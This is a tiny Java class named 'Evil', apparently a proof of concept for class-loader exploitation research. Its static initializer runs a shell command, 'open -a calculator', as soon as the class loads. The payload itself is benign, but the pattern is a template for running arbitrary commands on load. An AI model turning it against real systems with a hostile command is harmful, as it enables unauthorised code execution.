package com.trganda.loader;

import java.io.IOException;

public class Evil {
    static {
        try {
            Runtime.getRuntime().exec("open -a calculator");
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }
}
